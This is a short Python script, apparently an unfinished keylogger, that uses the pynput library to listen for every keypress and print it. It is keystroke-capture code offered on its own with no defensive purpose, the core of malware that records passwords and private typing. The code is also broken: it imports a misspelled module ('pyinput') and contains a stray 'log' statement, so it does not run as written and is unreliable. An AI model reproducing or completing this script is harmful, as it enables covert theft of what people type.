#!/usr/bin/env python3

#need pynput - not preinstalled
#pip install pynput / pip3 install pynput

import pyinput.keyboard

def process_keypress(key):
    log 
    print(key)
    

keyboard_listener = pynput.keyboard.Listener(on_press = process_keypress)
#create listener object from pynput and store as var
#pass to process_keypress function defined above

with keyboard_listener:
    keyboard_listener.join()
